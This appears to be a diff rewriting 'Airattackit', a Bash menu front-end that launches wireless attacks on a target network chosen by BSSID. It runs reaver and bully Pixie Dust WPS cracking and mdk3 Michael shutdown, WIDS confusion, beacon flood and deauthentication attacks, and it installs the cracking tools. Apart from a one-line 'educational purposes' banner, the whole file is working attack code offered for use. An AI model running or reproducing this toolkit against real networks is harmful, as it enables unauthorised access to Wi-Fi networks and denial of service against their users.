@@ -1,35 +1,208 @@
 #!/bin/bash
-#Author
-#Joyghosh<joychondroghosh@gmail.com>
-cyan='\e[0;36m'
-lightcyan='\e[96m'
-green='\e[0;32m'
-lightgreen='\e[1;32m'
-white='\e[1;37m'
-red='\e[1;31m'
-yellow='\e[1;33m'
-blue='\e[1;34m'
-clear
-echo -ne '                    ------------------AIRATTACKIT-------------------------------\r'
-sleep 1.5
-echo -ne '                    -----------Automated----Simple---Attack-Framework----------\r'
-sleep 1.5
-echo -ne '                     -----------------By JoyGhosh--------------------------------\r'
-sleep 1.5
+# Author
+# Joyghosh <joychondroghosh@gmail.com>
 
-echo -ne '\n'
-function main_menu()
-            {
-       while :
-     do
-clear
-echo -ne "\033]0;Airattackit(By JoyGhosh)\007"
-resize -s 31 100
+# Color codes
+cyan="\033[0;36m"
+lightcyan="\033[96m"
+green="\033[0;32m"
+lightgreen="\033[1;32m"
+white="\033[1;37m"
+red="\033[1;31m"
+yellow="\033[1;33m"
+blue="\033[1;34m"
+magenta="\033[1;35m"
+lightmagenta="\033[95m"
+lightyellow="\033[93m"
+lightred="\033[91m"
+
+# === Root Checking Section ===
+
+# Check for root permissions
+if [[ $EUID -ne 0 ]]; then
+    echo -e "${red}Error: This script requires root privileges to run.${white}"
+    echo -e "${yellow}Please run as root or use 'sudo' to launch the script.${white}"
+    echo -e "${lightcyan}Exiting Airattackit script. Thank you!${white}"
+    exit 1
+fi
+
 clear
 
-echo -e """ ${red}
+# === Intro Section ===
+#intro function
+echo -e " ${lightgreen}     
+                :::     ::::     :::: ::::    :::  ::::::::   :::::::: :::::::::::     :::     
+              :+: :+:   +:+:+: :+:+:+ :+:+:   :+: :+:    :+: :+:    :+:    :+:       :+: :+:   
+             +:+   +:+  +:+ +:+:+ +:+ :+:+:+  +:+        +:+ +:+           +:+      +:+   +:+  
+            +#++:++#++: +#+  +:+  +#+ +#+ +:+ +#+     +#++:  +#++:++#++    +#+     +#++:++#++: 
+            +#+     +#+ +#+       +#+ +#+  +#+#+#        +#+        +#+    +#+     +#+     +#+ 
+            #+#     #+# #+#       #+# #+#   #+#+# #+#    #+# #+#    #+#    #+#     #+#     #+# 
+            ###     ### ###       ### ###    ####  ########   ######## ########### ###     ### 
+        "  
+sleep 1
+
+echo -e "
+     ${yellow}____________________________________________________________________________________________________
+
+       Note:${red} This tool is for educational purposes if caught using it illegally... own your ${blue}IGNORANCE. 
+     ${yellow}____________________________________________________________________________________________________${white}
+        "
+      sleep 3  
+
+# Function to check if a tool is available
+check_tool() {
+    if command -v "$1" &> /dev/null; then
+        echo -e "$1 ${green}..ok${white}"
+    else
+        echo -e "$1 ${red} ..missing${white}"
+    fi
+}
+
+echo -e "${blue}Essential Tools Required:${white}
+$(check_tool aircrack-ng)
+$(check_tool reaver)
+$(check_tool bully)
+$(check_tool mdk3)
+$(check_tool wifite)
+$(check_tool hcxdumptool)
+$(check_tool hcxtools)
+$(check_tool hashcat)
+
+${blue}Optional Tools:${white}
+$(check_tool git)
+$(check_tool gnome-terminal)  (for opening new terminal windows)
+$(check_tool xterm)  (for opening new terminal windows)
+
+${blue}Please install the required tools before proceeding...or nothing will work${yellow}
+"  
+printf "${blue}Press any key to continue ...${white}"
+read -n1 -r
+continue
+
+# Function to set terminal title
+set_title() {
+    echo -ne "\033]0;$1\007"
+} 
+
+# Function to put wireless card in monitor mode
+monitor_mode() {
+    printf "${blue}Enter Interface Name>: ${white}"
+    read i
+    airmon-ng start "$i"
+    printf "${blue}Press any key to return ...${white}"
+    read -n1 -r
+}
+
+# Function to put wireless card in managed mode
+managed_mode() {
+    printf "${blue}Enter Interface Name>: ${white}"
+    read i
+    airmon-ng stop "$i"
+    printf "${blue}Press any key to return ...${white}"
+    read -n1 -r
+}
+
+# Function to install required tools
+install_tools() {
+    sudo apt-get update
+    sudo apt-get install -y hcxdumptool hcxtools hashcat git 
+
+    echo -e "\n${blue}Installed Tools Status:${white}"
+    all_installed=true
+
+    check_and_update_status() {
+        if command -v "$1" &> /dev/null; then
+            echo -e "$1 ${green}..ok${white}"
+        else
+            echo -e "$1 ${red} ..missing${white}"
+            all_installed=false
+            # Display helpful installation URLs for missing tools
+            case "$1" in
+                wifite)
+                    echo -e "${magenta}You can install wifite from: https://github.com/derv82/wifite2.git${white}"
+                    ;;
+                aircrack-ng)
+                    echo -e "${magenta}You can install aircrack-ng from: https://github.com/aircrack-ng/aircrack-ng.git${white}"
+                    ;;
+                hashcat)
+                    echo -e "${magenta}You can install hashcat from: https://github.com/hashcat/hashcat.git${white}"
+                    ;;
+                reaver)
+                    echo -e "${magenta}You can install reaver from: https://github.com/t6x/reaver-wps-fork-t6x.git${white}"
+                    ;;
+                bully)
+                    echo -e "${magenta}You can install bully from: https://github.com/aanarchyy/bully.git${white}"
+                    ;;
+                hcxtools)
+                    echo -e "${magenta}You can install hcxtools from: https://github.com/ZerBea/hcxtools.git${white}"
+                    ;;
+                hcxdumptool)
+                    echo -e "${magenta}You can install hcxdumptool from: https://github.com/ZerBea/hcxdumptool.git${white}"
+                    ;;
+            esac
+        fi
+    }
+
+    check_and_update_status aircrack-ng
+    check_and_update_status reaver
+    check_and_update_status bully
+    check_and_update_status mdk3
+    check_and_update_status wifite
+    check_and_update_status hcxdumptool
+    check_and_update_status hcxtools
+    check_and_update_status hashcat
+    check_and_update_status git
+    check_and_update_status gnome-terminal
+    check_and_update_status xterm
+
+    if $all_installed; then
+        printf "${blue}Installation complete. Press any key to return ...${white}"
+        read -n1 -r
+    else
+        printf "${blue}Installation incomplete. Some tools are missing. Press any key to return ...${white}"
+        read -n1 -r
+    fi
+}
+
+# Function to validate interface name input
+validate_interface() {
+    if [[ -z "$1" ]]; then
+        echo "Interface name cannot be empty."
+        return 1
+    fi
+    return 0
+}
+
+# Function to validate BSSID input
+validate_bssid() {
+    if [[ ! "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+        echo "Invalid BSSID format."
+        return 1
+    fi
+    return 0
+}
+
+# Function to validate channel input
+validate_channel() {
+    if ! [[ "$1" =~ ^[0-9]+$ ]]; then
+        echo "Channel must be a number."
+        return 1
+    fi
+    return 0
+}
+
+# === Main Menu Section ===
+
+# Main menu function
+main_menu() {
+    while :; do
+        clear
+        #resize -s 31 100
+        clear
+
+        echo -e "${lightcyan}
 ********************************************************************************
-                     Automated Wirless Attack Toolkit
+                     Automated Wireless Attack Toolkit
 ********************************************************************************
  █████╗ ██╗██████╗  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗██╗████████╗    
 ██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██║╚══██╔══╝    
@@ -38,101 +211,150 @@ echo -e """ ${red}
 ██║  ██║██║██║  ██║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██║   ██║       
 ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝  
 ********************************************************************************
-                            From JoyGhosh
-********************************************************************************
-"""
-echo -e """ ${yellow}
+${white}                            From JoyGhosh
+${lightcyan}********************************************************************************
+${yellow}
 ________________________________________________________________________________
-        (if Your Card Is In Manged Mode Turn On Monitor Mode Before Any Attack)
+(If Your Card Is In Managed Mode Turn On Monitor Mode Before Any Attack)
 
-                       mon.)Put WirelessCard In Monitor Mode
-                       man.)Put Wireless Card In Managed Mode
-                         r.)Install Requierd Tools
-                         e.)Exit
+mon)  Put Wireless Card In Monitor Mode
+man)  Put Wireless Card In Managed Mode
+r)    Install Required Tools
+h)    Help
+e)    Exit
 --------------------------------------------------------------------------------
-     1.PixleDust Attack(Rever)
-     2.PixleDust Attack(Bully)
-     3.Micale Shutdown Attack(mdk3)
-     4.Wifite(automated Attack FrameWork)
-     5.WIDS/WIPS Confusion Attack(mdk3)
-     6.Beacon Flood(mdk3)
-     7.Deauthentication Attack(mdk3)
-"""
-read -p "AirAttackit>: " option
-case "$option" in 
-            mon)clear
-                   read -p "Enter Interface Name>: " i
-                   airmon-ng start $i
-                   read -p "press any key to return ..."
-                   clear
-                   ;;
-             man)clear 
-                    read -p "Enter Interface Name>: " i
-                    airmon-ng stop $i
-                    read -p "press any key to return ..."
-                    clear
-                    ;;
-                 1)clear
-                  read -p "Enter Interface Name>: " i
-                  gnome-terminal -- wash -i $i
-                 read -p "Enter Bssid Of Target Network>: " bssid
-                 read -p "Enter Channle Of Target Network>: " c
-                 xterm -hold -T "Pixle-WPS(Reaver)" -e "reaver -i $i -b $bssid -c $c -vvv -K 1 -f"
-                 ;;
-               2)clear
-                  read -p "Enter Interface Name>: " i
-                  gnome-terminal -- wash -i $i
-                 read -p "Enter Bssid Of Target Network>: " bssid
-                 read -p "Enter Channle Of Target Network>: " c
-                 xterm -hold -T "Pixle-WPS(Bully)" -e "bully -b $bssid $i -c $c -d -v 3"
-                 ;;
-                3)clear
-                 read -p "Enter Interface Name>: " i
-                 gnome-terminal -- airodump-ng  $i
-                 read -p "Enter Bssid Of Target Network>: " bssid
-                 xterm -hold -T "Micale ShutdownAttack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i m -t $bssid"
-                 echo "Attack Is Running./././././././"
-                 ;;
-                4)clear
-                  xterm -hold -T "Wifite Automated Attack" -e "wifite"
-                   ;;
-                5)clear
-                 read -p "Enter Interface Name>: " i
-                 gnome-terminal -- airodump-ng  $i
-                 read -p "Enter Bssid Of Target Network>: " bssid
-                 read -p "Enter essid Of Target Network>: " ssid
-                 xterm -hold -T "WIDS/WIPS Confusion Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i w -t $bssid -e $ssid"
-                 echo "Attack Is Running./././././././"
-                 ;; 
-                 
-               6)clear
-               read -p "Enter Interface Name>: " i
-               gnome-terminal -- airodump-ng $i
-               read -p "Enter Bssid Of Target Network>: " bssid
-               xterm -hold -T "Becon Flood(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i b $bssid"
-               echo "Attack Is Running./././././././"
-               ;;
-              7)clear
-                read -p "Enter Interface Name>: " i
-               gnome-terminal -- airodump-ng $i
-               read -p "Enter Bssid Of Target Network>: " bssid
-               xterm -hold -T "Deauth Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i d $bssid"
-               echo "Attack Is Running./././././././"
-               ;;
-                 
-                r)clear
-                  apt-get update
-                  apt-get install hcxdumptool
-                  apt-get install hcxtools
-                  apt-get install hashcat
-                  ;;
-                 e)exit
-                  ;;
-                 
-                          
-
-                
-          esac
+ 1) PixleDust Attack (Reaver)
+ 2) PixleDust Attack (Bully)
+ 3) Micale Shutdown Attack (mdk3)
+ 4) Wifite (Automated Attack Framework)
+ 5) WIDS/WIPS Confusion Attack (mdk3)
+ 6) Beacon Flood (mdk3)
+ 7) Deauthentication Attack (mdk3)
+--------------------------------------------------------------------------------
+"
+        read -p "AirAttackit> " option
+        case "$option" in
+            mon)
+                clear
+                monitor_mode
+                ;;
+            man)
+                clear
+                managed_mode
+                ;;
+            r)
+                clear
+                install_tools
+                ;;
+            h)
+                clear
+                echo -e "${cyan}Help - Airattackit Menu Options:${white}
+mon)  Put Wireless Card In Monitor Mode
+man)  Put Wireless Card In Managed Mode
+r)    Install Required Tools
+e)    Exit
+1)    PixleDust Attack (Reaver)
+2)    PixleDust Attack (Bully)
+3)    Micale Shutdown Attack (mdk3)
+4)    Wifite (Automated Attack Framework)
+5)    WIDS/WIPS Confusion Attack (mdk3)
+6)    Beacon Flood (mdk3)
+7)    Deauthentication Attack (mdk3)
+"
+                read -p "Press any key to return ..."
+                ;;
+            1)
+                clear
+                printf "${blue}Enter Interface Name>: ${white}"
+                read i
+                if ! validate_interface "$i"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                gnome-terminal -- wash -i "$i"
+                printf "${blue}Enter BSSID Of Target Network>: ${white}"
+                read bssid
+                if ! validate_bssid "$bssid"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                printf "${blue}Enter Channel Of Target Network>: ${white}"
+                read c
+                if ! validate_channel "$c"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                xterm -hold -T "Pixle-WPS (Reaver)" -e "reaver -i $i -b $bssid -c $c -vvv -K 1 -f"
+                ;;
+            2)
+                clear
+                printf "${blue}Enter Interface Name>: ${white}"
+                read i
+                if ! validate_interface "$i"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                gnome-terminal -- wash -i "$i"
+                printf "${blue}Enter BSSID Of Target Network>: ${white}"
+                read bssid
+                if ! validate_bssid "$bssid"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                printf "${blue}Enter Channel Of Target Network>: ${white}"
+                read c
+                if ! validate_channel "$c"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                xterm -hold -T "Pixle-WPS (Bully)" -e "bully -b $bssid $i -c $c -d -v 3"
+                ;;
+            3)
+                clear
+                printf "${blue}Enter Interface Name>: ${white}"
+                read i
+                if ! validate_interface "$i"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                gnome-terminal -- airodump-ng "$i"
+                printf "${blue}Enter BSSID Of Target Network>: ${white}"
+                read bssid
+                if ! validate_bssid "$bssid"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                xterm -hold -T "Micale Shutdown Attack (mdk3)" -e "echo 'Attack Is Running...'; mdk3 $i m -t $bssid"
+                echo "Attack Is Running..."
+                ;;
+            4)
+                clear
+                xterm -hold -T "Wifite Automated Attack" -e "wifite"
+                ;;
+            5)
+                clear
+                printf "${blue}Enter Interface Name>: ${white}"
+                read i
+                if ! validate_interface "$i"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                gnome-terminal -- airodump-ng "$i"
+                printf "${blue}Enter BSSID Of Target Network>: ${white}"
+                read bssid
+                if ! validate_bssid "$bssid"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                printf "${blue}Enter ESSID Of Target Network>: ${white}"
+                read ssid
+                xterm -hold -T "WIDS/WIPS Confusion Attack (mdk3)" -e "echo 'Attack Is Running...'; mdk3 $i w -t $bssid -e $ssid"
+                echo "Attack Is Running..."
+                ;;
+            6)
+                clear
+                printf "${blue}Enter Interface Name>: ${white}"
+                read i
+                if ! validate_interface "$i"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                gnome-terminal -- airodump-ng "$i"
+                printf "${blue}Enter BSSID Of Target Network>: ${white}"
+                read bssid
+                if ! validate_bssid "$bssid"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                xterm -hold -T "Beacon Flood (mdk3)" -e "echo 'Attack Is Running...'; mdk3 $i b $bssid"
+                echo "Attack Is Running..."
+                ;;
+            7)
+                clear
+                printf "${blue}Enter Interface Name>: ${white}"
+                read i
+                if ! validate_interface "$i"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                gnome-terminal -- airodump-ng "$i"
+                printf "${blue}Enter BSSID Of Target Network>: ${white}"
+                read bssid
+                if ! validate_bssid "$bssid"; then printf "${blue}Press any key to return ...${white}"; read -n1 -r; continue; fi
+                xterm -hold -T "Deauth Attack (mdk3)" -e "echo 'Attack Is Running...'; mdk3 $i d $bssid"
+                echo "Attack Is Running..."
+                ;;
+            e)
+                exit
+                ;;
+            *)
+                echo "Invalid option. Please try again."
+                printf "${blue}Press any key to return ...${white}"
+                read -n1 -r
+                ;;
+        esac
     done
 }
+
 main_menu
